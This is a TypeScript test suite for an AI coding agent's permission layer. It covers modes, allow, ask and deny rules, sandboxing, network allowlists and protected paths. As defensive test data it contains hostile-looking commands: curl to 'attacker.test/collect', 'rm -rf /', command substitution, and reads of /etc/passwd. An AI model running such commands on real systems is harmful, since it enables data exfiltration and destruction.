import { describe, it, expect, beforeEach, afterAll } from "vitest";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import {
  MODE_INFO,
  PERMISSION_MODES,
  evaluatePermission,
  checkPermission,
  classifyAction,
  isCriticalDeleteTarget,
  isExternalEffect,
  isInsideWorkspace,
  isProtectedPath,
  isReadOnlyCommand,
  normalizePermissionMode,
  analyzeBashRisk,
  isOptionSelected,
  suggestRule,
  invalidatePermissionSettings,
  resolvePermissionSettings,
  extractHosts,
} from "@cowrangler/core/permissions.js";
import {
  matchBashPattern,
  matchDomainPattern,
  matchPathPattern,
  matchToolName,
  parseRule,
  toolAliases,
} from "@cowrangler/core/permission_rules.js";
import { setProjectContext, getProjectWorkdir } from "@cowrangler/core/project_context.js";

const WS = fs.mkdtempSync(path.join(os.tmpdir(), "cowrangler-perms-"));
const SETTINGS_DIR = path.join(WS, ".cowrangler");

// Point managed settings at a path that will never exist so a real managed
// policy on the developer's machine cannot influence the suite.
process.env.COWRANGLER_MANAGED_SETTINGS = path.join(WS, "no-managed-policy.json");

function writeSettings(scope: "settings.json" | "settings.local.json", json: unknown): void {
  fs.mkdirSync(SETTINGS_DIR, { recursive: true });
  fs.writeFileSync(path.join(SETTINGS_DIR, scope), JSON.stringify(json, null, 2));
  invalidatePermissionSettings();
}

function clearSettings(): void {
  fs.rmSync(SETTINGS_DIR, { recursive: true, force: true });
  invalidatePermissionSettings();
}

/** Shorthand: evaluate a call and return just the behavior. */
function behavior(tool: string, input: Record<string, unknown>, mode?: string): string {
  return evaluatePermission({ tool, input, mode }).behavior;
}

beforeEach(() => {
  setProjectContext(WS);
  clearSettings();
});

afterAll(() => {
  fs.rmSync(WS, { recursive: true, force: true });
});

// ─────────────────────────────────────────────────────────────────────────────

describe("permission modes", () => {
  it("exposes the six Claude Code modes with UI copy for each", () => {
    expect(PERMISSION_MODES).toEqual([
      "default", "acceptEdits", "plan", "auto", "dontAsk", "bypassPermissions",
    ]);
    for (const mode of PERMISSION_MODES) {
      expect(MODE_INFO[mode].label).toBeTruthy();
      expect(MODE_INFO[mode].summary).toBeTruthy();
      expect(MODE_INFO[mode].detail.length).toBeGreaterThan(40);
    }
  });

  it("accepts Anthropic's aliases", () => {
    expect(normalizePermissionMode("manual")).toBe("default");
    expect(normalizePermissionMode("acceptEdits")).toBe("acceptEdits");
    expect(normalizePermissionMode("dontAsk")).toBe("dontAsk");
    expect(normalizePermissionMode("bypassPermissions")).toBe("bypassPermissions");
  });

  it("keeps the pre-rewrite spellings working so an old config still means what it did", () => {
    expect(normalizePermissionMode("ask")).toBe("default");
    expect(normalizePermissionMode("accept")).toBe("acceptEdits");
    expect(normalizePermissionMode("bypass")).toBe("bypassPermissions");
  });

  it("falls back to the safest mode for anything unrecognised", () => {
    expect(normalizePermissionMode("nonsense")).toBe("default");
    expect(normalizePermissionMode(undefined)).toBe("default");
    expect(normalizePermissionMode("")).toBe("default");
  });
});

// ─────────────────────────────────────────────────────────────────────────────

describe("rule parsing", () => {
  it("parses bare tool names, specifiers and parameter rules", () => {
    expect(parseRule("Bash").rule?.tool).toBe("Bash");
    expect(parseRule("Bash").rule?.specifier).toBeUndefined();
    expect(parseRule("Bash(npm run build)").rule).toMatchObject({ tool: "Bash", specifier: "npm run build" });
    expect(parseRule("Agent(model:opus)").rule?.param).toEqual({ name: "model", value: "opus" });
  });

  it("treats WebFetch's domain: as a matcher, not a parameter", () => {
    expect(parseRule("WebFetch(domain:example.com)").rule?.param).toBeUndefined();
  });

  it("refuses a rule that would match a tool's primary content field", () => {
    // `Bash(command:rm *)` is bypassable with a compound command, so it is
    // rejected rather than accepted and quietly under-matched.
    const { rule, issue } = parseRule("Bash(command:rm *)");
    expect(rule).toBeNull();
    expect(issue?.reason).toContain("primary content field");
  });

  it("refuses an MCP rule written with parentheses", () => {
    expect(parseRule("mcp__github(get_issue)").rule).toBeNull();
  });
});

describe("bash wildcard matching", () => {
  // The table from Anthropic's permission reference, verbatim.
  const cases: [string, string, boolean][] = [
    ["Bash(npm run build)", "npm run build", true],
    ["Bash(npm run build)", "npm run build --watch", false],
    ["npm run *", "npm run build", true],
    ["npm run *", "npm run test --watch", true],
    ["npm run *", "npm run", true],
    ["npm run *", "npm install", false],
    ["git log * main", "git log --oneline main", true],
    ["git log * main", "git log -5 main", true],
    ["git log * main", "git log main", false],
    ["git log * main", "git push origin main", false],
    ["git * main", "git merge main", true],
    ["git * main", "git push origin main", true],
    ["git * main", "git log", false],
    ["* --version", "node --version", true],
    ["* --version", "node -v", false],
    ["ls *", "ls -la", true],
    ["ls *", "ls", true],
    ["ls *", "lsof", false],
    ["ls*", "lsof", true],
    ["* --help *", "npm --help x", true],
    ["* --help *", "npm --help", false],
  ];
  for (const [pattern, command, expected] of cases) {
    it(`${pattern} ${expected ? "matches" : "does not match"} ${command}`, () => {
      const pat = pattern.startsWith("Bash(") ? pattern.slice(5, -1) : pattern;
      expect(matchBashPattern(pat, command)).toBe(expected);
    });
  }

  it("treats the :* suffix as an equivalent trailing wildcard", () => {
    expect(matchBashPattern("ls:*", "ls -la")).toBe(true);
    expect(matchBashPattern("ls:*", "ls")).toBe(true);
    expect(matchBashPattern("ls:*", "lsof")).toBe(false);
  });
});

describe("path pattern matching", () => {
  const ctx = (ruleType: "allow" | "ask" | "deny") => ({ cwd: WS, settingsDir: WS, ruleType });

  it("anchors // at the filesystem root and ~ at home", () => {
    expect(matchPathPattern("//tmp/**", "/tmp/scratch.txt", ctx("deny"))).toBe(true);
    expect(matchPathPattern("~/.zshrc", path.join(os.homedir(), ".zshrc"), ctx("deny"))).toBe(true);
  });

  it("anchors a single leading slash at the settings source, not the filesystem root", () => {
    expect(matchPathPattern("/src/**", path.join(WS, "src/app.ts"), ctx("allow"))).toBe(true);
    expect(matchPathPattern("/src/**", "/src/app.ts", ctx("allow"))).toBe(false);
  });

  it("matches a bare filename at any depth, gitignore-style", () => {
    expect(matchPathPattern(".env", path.join(WS, ".env"), ctx("deny"))).toBe(true);
    expect(matchPathPattern(".env", path.join(WS, "packages/api/.env"), ctx("deny"))).toBe(true);
  });

  it("scopes a single-segment directory by rule type", () => {
    const nested = path.join(WS, "vendor/pkg/src/lib.js");
    const top = path.join(WS, "src/app.ts");
    // Allow rules stay at the anchor so a vendored copy cannot inherit trust.
    expect(matchPathPattern("src/**", top, ctx("allow"))).toBe(true);
    expect(matchPathPattern("src/**", nested, ctx("allow"))).toBe(false);
    // Deny and ask rules reach every depth so a nested copy is covered too.
    expect(matchPathPattern("src/**", nested, ctx("deny"))).toBe(true);
    expect(matchPathPattern("**/src/**", nested, ctx("allow"))).toBe(true);
  });

  it("covers the directory itself, not only its contents", () => {
    expect(matchPathPattern("secrets/**", path.join(WS, "secrets"), ctx("deny"))).toBe(true);
  });

  it("never matches outside its anchor", () => {
    expect(matchPathPattern("src/**", "/etc/passwd", ctx("deny"))).toBe(false);
  });
});

describe("domain matching", () => {
  it("matches exactly, case-insensitively, ignoring a trailing dot", () => {
    expect(matchDomainPattern("example.com", "EXAMPLE.com.")).toBe(true);
    expect(matchDomainPattern("example.com", "api.example.com")).toBe(false);
  });

  it("matches subdomains at any depth with a leading *. but not the apex", () => {
    expect(matchDomainPattern("*.example.com", "api.example.com")).toBe(true);
    expect(matchDomainPattern("*.example.com", "a.b.example.com")).toBe(true);
    expect(matchDomainPattern("*.example.com", "example.com")).toBe(false);
  });

  it("keeps a mid-pattern wildcard inside one label, so a lookalike cannot match", () => {
    expect(matchDomainPattern("example.*", "example.org")).toBe(true);
    expect(matchDomainPattern("example.*", "example.evil.com")).toBe(false);
  });

  it("matches everything with a bare *", () => {
    expect(matchDomainPattern("*", "anything.internal")).toBe(true);
  });
});

describe("tool naming", () => {
  it("maps Co-Wrangler tools onto Claude Code capability names", () => {
    expect(toolAliases("execute_bash")).toContain("Bash");
    expect(toolAliases("write_file")).toContain("Edit");
    expect(toolAliases("read_file")).toContain("Read");
    expect(toolAliases("fetch_webpage")).toContain("WebFetch");
  });

  it("lets an mcp__server rule cover every tool from that server", () => {
    const rule = parseRule("mcp__github").rule!;
    expect(matchToolName(rule, "mcp__github__get_issue", "deny")).toBe(true);
    expect(matchToolName(rule, "mcp__gitlab__get_issue", "deny")).toBe(false);
  });

  it("honours a tool-name glob for deny but not for an unanchored allow", () => {
    const glob = parseRule("mcp__*").rule!;
    expect(matchToolName(glob, "mcp__github__get_issue", "deny")).toBe(true);
    // An unanchored allow glob must never auto-approve anything.
    expect(matchToolName(glob, "mcp__github__get_issue", "allow")).toBe(false);
    const anchored = parseRule("mcp__github__get_*").rule!;
    expect(matchToolName(anchored, "mcp__github__get_issue", "allow")).toBe(true);
    expect(matchToolName(anchored, "mcp__github__create_issue", "allow")).toBe(false);
  });
});

// ─────────────────────────────────────────────────────────────────────────────

describe("decision precedence", () => {
  it("blocks a critical command in every mode, bypass included", () => {
    for (const mode of PERMISSION_MODES) {
      const d = evaluatePermission({ tool: "execute_bash", input: { command: "rm -rf /" }, mode });
      expect(d.behavior).toBe("deny");
      expect(d.source).toBe("critical-command");
    }
  });

  it("puts deny ahead of allow, whatever order they appear in", () => {
    writeSettings("settings.json", {
      permissions: { allow: ["Bash(git push *)"], deny: ["Bash(git push *)"] },
    });
    const d = evaluatePermission({
      tool: "execute_bash",
      input: { command: "git push origin main" },
      mode: "auto",
    });
    expect(d.behavior).toBe("deny");
    expect(d.matchedRuleType).toBe("deny");
  });

  it("puts ask ahead of allow", () => {
    writeSettings("settings.json", {
      permissions: { allow: ["Bash(npm run *)"], ask: ["Bash(npm run deploy*)"] },
    });
    expect(behavior("execute_bash", { command: "npm run build" }, "default")).toBe("allow");
    expect(behavior("execute_bash", { command: "npm run deploy" }, "default")).toBe("ask");
  });

  it("still honours a deny rule in bypassPermissions mode", () => {
    writeSettings("settings.json", { permissions: { deny: ["Read(.env)"] } });
    expect(behavior("read_file", { path: ".env" }, "bypassPermissions")).toBe("deny");
    expect(behavior("read_file", { path: "src/app.ts" }, "bypassPermissions")).toBe("allow");
  });

  it("asks before writing a path that could widen Claude's own permissions", () => {
    for (const mode of ["auto", "acceptEdits", "default"]) {
      const d = evaluatePermission({
        tool: "write_file",
        input: { path: ".cowrangler/settings.json" },
        mode,
      });
      expect(d.behavior).toBe("ask");
      expect(d.source).toBe("protected-path");
      // A protected path is never persistable as an allow rule — the point is
      // that the answer does not carry to the next run.
      expect(d.suggestedRule).toBeUndefined();
    }
  });

  it("recognises the protected paths individually", () => {
    expect(isProtectedPath(path.join(WS, ".cowrangler/settings.json"))).toBe(true);
    expect(isProtectedPath(path.join(WS, ".git/hooks/pre-commit"))).toBe(true);
    expect(isProtectedPath(path.join(WS, ".mcp.json"))).toBe(true);
    expect(isProtectedPath(path.join(os.homedir(), ".cowrangler/credentials.env"))).toBe(true);
    expect(isProtectedPath(path.join(WS, "src/app.ts"))).toBe(false);
  });

  it("stops a delete aimed at a filesystem root, home, or the workspace itself", () => {
    expect(isCriticalDeleteTarget("/")).toBe(true);
    expect(isCriticalDeleteTarget(os.homedir())).toBe(true);
    expect(isCriticalDeleteTarget(WS)).toBe(true);
    expect(isCriticalDeleteTarget(path.join(WS, "build"))).toBe(false);
    expect(behavior("delete_folder", { path: WS }, "auto")).toBe("ask");
  });
});

describe("mode behaviour", () => {
  it("default: reads flow, edits ask", () => {
    expect(behavior("read_file", { path: "src/app.ts" }, "default")).toBe("allow");
    expect(behavior("write_file", { path: "src/app.ts" }, "default")).toBe("ask");
  });

  it("default: a command the sandbox cannot confine still asks", () => {
    // Sandbox auto-allow is an independent axis and covers `npm run build`
    // even in Manual mode; a command with an external effect is not confinable
    // and comes back to the person.
    expect(behavior("execute_bash", { command: "git push origin main" }, "default")).toBe("ask");
    writeSettings("settings.json", { sandbox: { enabled: false } });
    expect(behavior("execute_bash", { command: "npm run build" }, "default")).toBe("ask");
  });

  it("plan: reads and read-only commands flow, writes are refused", () => {
    expect(behavior("read_file", { path: "src/app.ts" }, "plan")).toBe("allow");
    expect(behavior("execute_bash", { command: "git status" }, "plan")).toBe("allow");
    expect(behavior("write_file", { path: "src/app.ts" }, "plan")).toBe("deny");
    // Plan mode does not let the sandbox widen approvals.
    expect(behavior("execute_bash", { command: "npm run build" }, "plan")).toBe("deny");
  });

  it("acceptEdits: workspace edits flow, edits outside it do not", () => {
    expect(behavior("write_file", { path: "src/app.ts" }, "acceptEdits")).toBe("allow");
    expect(behavior("edit_file", { path: path.join(WS, "a/b.ts") }, "acceptEdits")).toBe("allow");
    expect(behavior("write_file", { path: "/etc/hosts" }, "acceptEdits")).toBe("ask");
    expect(behavior("execute_bash", { command: "mkdir -p build" }, "acceptEdits")).toBe("allow");
  });

  it("auto: reversible work flows, external effects stop", () => {
    expect(behavior("write_file", { path: "src/app.ts" }, "auto")).toBe("allow");
    const push = evaluatePermission({
      tool: "execute_bash",
      input: { command: "git push origin main" },
      mode: "auto",
    });
    expect(push.behavior).toBe("ask");
    expect(push.externalEffect).toBe(true);
    expect(behavior("write_file", { path: "/etc/hosts" }, "auto")).toBe("ask");
  });

  it("dontAsk: nothing prompts — uncovered calls are refused instead", () => {
    expect(behavior("write_file", { path: "src/app.ts" }, "dontAsk")).toBe("deny");
    writeSettings("settings.json", { permissions: { allow: ["Edit(src/**)"] } });
    expect(behavior("write_file", { path: "src/app.ts" }, "dontAsk")).toBe("allow");
    expect(behavior("write_file", { path: "docs/readme.md" }, "dontAsk")).toBe("deny");
  });

  it("bypassPermissions: everything short of a deny rule or critical command runs", () => {
    expect(behavior("write_file", { path: "/etc/hosts" }, "bypassPermissions")).toBe("allow");
    expect(behavior("execute_bash", { command: "git push origin main" }, "bypassPermissions")).toBe("allow");
  });

  it("lets a managed policy take the riskiest modes off the table", () => {
    writeSettings("settings.json", {
      permissions: { disableBypassPermissionsMode: "disable", disableAutoMode: "disable" },
    });
    // A disabled mode falls back to `default` rather than silently applying.
    expect(evaluatePermission({ tool: "write_file", input: { path: "a.ts" }, mode: "bypassPermissions" }).mode).toBe("default");
    expect(evaluatePermission({ tool: "write_file", input: { path: "a.ts" }, mode: "auto" }).mode).toBe("default");
  });
});

describe("working directories", () => {
  it("treats additionalDirectories as in-workspace", () => {
    const extra = fs.mkdtempSync(path.join(os.tmpdir(), "cowrangler-extra-"));
    writeSettings("settings.json", { permissions: { additionalDirectories: [extra] } });
    const settings = resolvePermissionSettings();
    expect(isInsideWorkspace(path.join(extra, "notes.md"), settings)).toBe(true);
    expect(behavior("write_file", { path: path.join(extra, "notes.md") }, "acceptEdits")).toBe("allow");
    fs.rmSync(extra, { recursive: true, force: true });
  });

  it("asks before reading outside the working directories", () => {
    const d = evaluatePermission({ tool: "read_file", input: { path: "/etc/passwd" }, mode: "default" });
    expect(d.behavior).toBe("ask");
    expect(d.source).toBe("outside-workspace");
  });
});

describe("sandboxing", () => {
  it("auto-allows a confinable command without a prompt", () => {
    const d = evaluatePermission({
      tool: "execute_bash",
      input: { command: "npm run build" },
      mode: "default",
    });
    expect(d.behavior).toBe("allow");
    expect(d.source).toBe("sandbox");
    expect(d.useSandbox).toBe(true);
  });

  it("falls back to the prompt when the command needs a host that is not allowed", () => {
    const d = evaluatePermission({
      tool: "execute_bash",
      input: { command: "curl https://registry.example.com/pkg" },
      mode: "default",
    });
    expect(d.behavior).toBe("ask");
  });

  it("runs unprompted once the host is on the allowlist", () => {
    writeSettings("settings.json", {
      sandbox: { enabled: true, network: { allowedDomains: ["registry.example.com"] } },
    });
    expect(behavior("execute_bash", { command: "curl https://registry.example.com/pkg" }, "default")).toBe("allow");
  });

  it("still prompts for a content-scoped ask rule even when the command is sandboxable", () => {
    writeSettings("settings.json", { permissions: { ask: ["Bash(npm run *)"] } });
    expect(behavior("execute_bash", { command: "npm run build" }, "default")).toBe("ask");
  });

  it("does not auto-allow a command excluded from the sandbox", () => {
    writeSettings("settings.json", {
      sandbox: { enabled: true, excludedCommands: ["npm run *"] },
    });
    const d = evaluatePermission({ tool: "execute_bash", input: { command: "npm run build" }, mode: "default" });
    expect(d.behavior).toBe("ask");
    expect(d.useSandbox).toBe(false);
  });

  it("prompts for everything when sandboxing is off", () => {
    writeSettings("settings.json", { sandbox: { enabled: false } });
    const d = evaluatePermission({ tool: "execute_bash", input: { command: "npm run build" }, mode: "default" });
    expect(d.behavior).toBe("ask");
    expect(d.useSandbox).toBe(false);
  });

  it("finds the hosts a command would reach", () => {
    expect(extractHosts("curl https://a.example.com/x && wget http://b.test/y")).toEqual([
      "a.example.com",
      "b.test",
    ]);
    expect(extractHosts("npm run build")).toEqual([]);
  });
});

describe("network reach", () => {
  // The sandbox allowlist is the answer to "which hosts may we talk to", and it
  // has to hold even when the command runs outside the sandbox — otherwise a
  // mode that auto-approves reversible work is an exfiltration path.
  it("stops a command reaching an unapproved host, in every mode that would otherwise allow it", () => {
    for (const mode of ["default", "acceptEdits", "auto"]) {
      const d = evaluatePermission({
        tool: "execute_bash",
        input: { command: "curl https://attacker.test/collect" },
        mode,
      });
      expect(d.behavior).toBe("ask");
      expect(d.reason).toContain("attacker.test");
    }
  });

  it("refuses it outright in dontAsk mode", () => {
    expect(behavior("execute_bash", { command: "curl https://attacker.test/x" }, "dontAsk")).toBe("deny");
  });

  it("lets it through once the host is allowed", () => {
    writeSettings("settings.json", {
      sandbox: { enabled: true, network: { allowedDomains: ["*.internal.example"] } },
    });
    expect(behavior("execute_bash", { command: "curl https://api.internal.example/x" }, "auto")).toBe("allow");
    expect(behavior("execute_bash", { command: "curl https://other.example/x" }, "auto")).toBe("ask");
  });

  it("asks before a web fetch to an unapproved domain, and remembers the answer as a domain rule", () => {
    const d = evaluatePermission({
      tool: "fetch_webpage",
      input: { url: "https://docs.example.com/guide" },
      mode: "auto",
    });
    expect(d.behavior).toBe("ask");
    expect(d.suggestedRule).toBe("WebFetch(domain:docs.example.com)");
  });

  it("honours an explicit WebFetch allow rule ahead of the domain check", () => {
    writeSettings("settings.json", { permissions: { allow: ["WebFetch(domain:docs.example.com)"] } });
    expect(behavior("fetch_webpage", { url: "https://docs.example.com/guide" }, "default")).toBe("allow");
    expect(behavior("fetch_webpage", { url: "https://elsewhere.example/x" }, "default")).toBe("ask");
  });

  it("leaves offline work alone", () => {
    expect(behavior("execute_bash", { command: "npm run build" }, "auto")).toBe("allow");
    expect(behavior("read_file", { path: "src/app.ts" }, "auto")).toBe("allow");
  });
});

describe("the unsandboxed escape hatch", () => {
  // A bare sandbox failure used to leave the model at a dead end, and a capable
  // model reacts to a dead end by routing around the boundary on its own. The
  // hatch exists so that workaround stays inside the permission system.
  it("always asks, in every mode that would otherwise auto-approve", () => {
    for (const mode of ["default", "acceptEdits", "auto"]) {
      const d = evaluatePermission({
        tool: "execute_bash",
        input: { command: "npm run build", dangerouslyDisableSandbox: true },
        mode,
      });
      expect(d.behavior).toBe("ask");
      expect(d.source).toBe("sandbox");
      expect(d.useSandbox).toBe(false);
    }
  });

  it("is never savable as an allow rule", () => {
    const d = evaluatePermission({
      tool: "execute_bash",
      input: { command: "npm run build", dangerouslyDisableSandbox: true },
      mode: "default",
    });
    // "Always run this unsandboxed" is not something to acquire by clicking.
    expect(d.suggestedRule).toBeUndefined();
  });

  it("is not pre-approved by an allow rule covering the command", () => {
    writeSettings("settings.json", { permissions: { allow: ["Bash(npm run *)"] } });
    expect(behavior("execute_bash", { command: "npm run build", dangerouslyDisableSandbox: true }, "auto")).toBe("ask");
  });

  it("is refused outright in strict sandbox mode", () => {
    writeSettings("settings.json", { sandbox: { allowUnsandboxedCommands: false } });
    const d = evaluatePermission({
      tool: "execute_bash",
      input: { command: "npm run build", dangerouslyDisableSandbox: true },
      mode: "default",
    });
    expect(d.behavior).toBe("deny");
    expect(d.reason).toContain("Strict sandbox mode");
  });

  it("is refused in dontAsk mode, which has no way to ask", () => {
    expect(behavior("execute_bash", { command: "npm run build", dangerouslyDisableSandbox: true }, "dontAsk")).toBe("deny");
  });

  it("still loses to a deny rule", () => {
    writeSettings("settings.json", { permissions: { deny: ["Bash(curl *)"] } });
    expect(behavior("execute_bash", { command: "curl https://x.test", dangerouslyDisableSandbox: true }, "default")).toBe("deny");
  });
});

describe("settings layering", () => {
  it("merges rule lists across scopes rather than replacing them", () => {
    writeSettings("settings.json", { permissions: { allow: ["Bash(npm run *)"] } });
    writeSettings("settings.local.json", { permissions: { allow: ["Bash(git status)"] } });
    const settings = resolvePermissionSettings();
    const raws = settings.allow.map((r) => r.raw);
    expect(raws).toContain("Bash(npm run *)");
    expect(raws).toContain("Bash(git status)");
  });

  it("lets local settings override the project's default mode", () => {
    writeSettings("settings.json", { permissions: { defaultMode: "plan" } });
    writeSettings("settings.local.json", { permissions: { defaultMode: "acceptEdits" } });
    expect(resolvePermissionSettings().defaultMode).toBe("acceptEdits");
  });

  it("accepts session rules on top of the files", () => {
    writeSettings("settings.json", { permissions: { allow: ["Bash(npm run *)"] } });
    const d = evaluatePermission({
      tool: "execute_bash",
      input: { command: "git push origin main" },
      mode: "default",
      session: { deny: ["Bash(git push *)"] },
    });
    expect(d.behavior).toBe("deny");
  });

  it("ignores a project-scope attempt to disable filesystem isolation", () => {
    // Turning the sandbox's filesystem layer off widens what any command can
    // do, so a checked-in repository file must not be able to do it to whoever
    // clones it.
    writeSettings("settings.json", { sandbox: { filesystem: { disabled: true } } });
    expect(resolvePermissionSettings().sandbox.filesystem.disabled).toBe(false);
  });

  it("reports rules it could not parse instead of silently dropping them", () => {
    writeSettings("settings.json", { permissions: { deny: ["Bash(command:rm *)"] } });
    // The rule is skipped, and the skip surfaces on the decision path.
    const d = evaluatePermission({ tool: "execute_bash", input: { command: "rm build" }, mode: "auto" });
    expect(d.behavior).not.toBe("deny");
  });
});

describe("read-only command detection", () => {
  const readOnly = ["ls -la", "cat package.json", "git status", "git log --oneline", "rg TODO src", "wc -l < a"];
  const notReadOnly = [
    "rm -rf build",
    "echo hi > file.txt",
    "cat $(whoami)",
    "npm install",
    "git config --global user.name x",
    "find . -delete",
  ];
  for (const c of readOnly) {
    it(`treats "${c}" as read-only`, () => expect(isReadOnlyCommand(c)).toBe(true));
  }
  for (const c of notReadOnly) {
    it(`does not treat "${c}" as read-only`, () => expect(isReadOnlyCommand(c)).toBe(false));
  }
});

describe("classification", () => {
  it("scores bash risk by pattern", () => {
    expect(analyzeBashRisk("ls -la")).toBe("moderate");
    expect(analyzeBashRisk("sudo apt install x")).toBe("dangerous");
    expect(analyzeBashRisk("rm -rf /")).toBe("critical");
  });

  it("flags effects that leave this machine", () => {
    expect(isExternalEffect("execute_bash", "git push origin main")).toBe(true);
    expect(isExternalEffect("execute_bash", "npm publish")).toBe(true);
    expect(isExternalEffect("execute_bash", "ssh host 'ls'")).toBe(true);
    expect(isExternalEffect("execute_bash", "npm run build")).toBe(false);
  });

  it("classifies by reversibility, and a write outside the workspace is not reversible", () => {
    expect(classifyAction("read_file", "a.ts")).toBe("readonly");
    expect(classifyAction("write_file", path.join(WS, "a.ts"))).toBe("reversible");
    expect(classifyAction("write_file", "/etc/hosts")).toBe("irreversible");
    expect(classifyAction("execute_bash", "git push origin main")).toBe("irreversible");
  });
});

describe("saving an answer", () => {
  it("suggests a rule shaped like the thing that was approved", () => {
    expect(suggestRule("execute_bash", "npm run build --watch")).toBe("Bash(npm run *)");
    expect(suggestRule("execute_bash", "prettier --write .")).toBe("Bash(prettier *)");
    expect(suggestRule("execute_bash", "git log --oneline")).toBe("Bash(git log *)");
    expect(suggestRule("fetch_webpage", "https://api.example.com/v1/x")).toBe("WebFetch(domain:api.example.com)");
    expect(suggestRule("write_file", "src/app.ts")).toBe("Edit(src/app.ts)");
  });

  it("escapes glob metacharacters so a saved path rule matches only that path", () => {
    expect(suggestRule("write_file", "reports/[2026-06] Q2.md")).toBe("Edit(reports/\\[2026-06\\] Q2.md)");
  });
});

describe("answer parsing", () => {
  it("reads the desktop's JSON answers and the CLI's plain text, in both languages", () => {
    expect(isOptionSelected(JSON.stringify({ kind: "choice", selected: ["Allow"] }), "Allow")).toBe(true);
    expect(isOptionSelected(JSON.stringify({ kind: "choice", selected: ["Deny"] }), "Allow")).toBe(false);
    expect(isOptionSelected("evet", "Allow")).toBe(true);
    expect(isOptionSelected("A: go ahead", "Allow")).toBe(true);
    expect(isOptionSelected(JSON.stringify({ kind: "choice", selected: ["Always allow"] }), "Always allow")).toBe(true);
  });
});

describe("legacy checkPermission surface", () => {
  it("still answers the pre-rewrite signature", () => {
    const r = checkPermission("execute_bash", "auto", "git push origin main");
    expect(r.allowed).toBe(false);
    expect(r.requiresApproval).toBe(true);
    expect(r.mode).toBe("auto");
    expect(r.externalEffect).toBe(true);
  });

  it("honours a policy passed in directly", () => {
    const r = checkPermission("execute_bash", "default", "npm run test", { allow: ["Bash(npm run *)"] });
    expect(r.allowed).toBe(true);
    expect(r.matchedRule).toBe("Bash(npm run *)");
  });

  it("keeps blocking critical commands", () => {
    const r = checkPermission("execute_bash", "auto", "rm -rf /", { allow: ["Bash(*)"] });
    expect(r.allowed).toBe(false);
    expect(r.reason).toContain("blocked in every permission mode");
  });
});

describe("workspace root", () => {
  it("resolves against the active project context", () => {
    expect(getProjectWorkdir()).toBe(WS);
    expect(isInsideWorkspace(path.join(WS, "src/foo.ts"))).toBe(true);
    expect(isInsideWorkspace("src/foo.ts")).toBe(true);
    expect(isInsideWorkspace("/etc/passwd")).toBe(false);
    expect(isInsideWorkspace(undefined)).toBe(true);
  });
});
